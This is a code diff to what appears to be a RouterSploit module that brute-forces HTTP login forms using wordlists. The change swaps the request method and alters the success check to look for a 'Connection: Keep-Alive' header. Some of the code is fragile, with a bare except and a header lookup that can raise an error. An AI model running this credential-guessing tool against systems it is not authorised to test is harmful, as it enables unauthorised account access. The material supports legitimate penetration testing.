@@ -1,6 +1,8 @@
 from routersploit.core.exploit import *
 from routersploit.core.http.http_client import HTTPClient
 from routersploit.resources import wordlists
+from requests_html import HTMLSession
+import requests
 
 
 class Exploit(HTTPClient):
@@ -66,13 +68,14 @@ class Exploit(HTTPClient):
                     self.password_field : password,
                     }
 
-                response = self.http_request(
-                    method="POST",
-                    path=self.path,
-                    data=auth,
-                )
+                #response = self.http_request(
+                #    method="POST",
+                #    path=self.path,
+                #    data=auth,
+                #)
+                response = requests.post("http://" + self.target + self.path, auth)
 
-                if response is not None and response.status_code != 403:
+                if response is not None and response.headers["Connection"] == "Keep-Alive":
                     if self.stop_on_success:
                         running.clear()
 
@@ -87,7 +90,11 @@ class Exploit(HTTPClient):
 
     def check(self):
         session = HTMLSession()
-        r = session.get(URL)
+        try:
+            r = session.get(self.target)
+        except:
+            print_error("Connection Exception")
+            return False
         
         username_element = r.html.find('[type=text]', first=True)
         if 'name' in username_element.attrs:
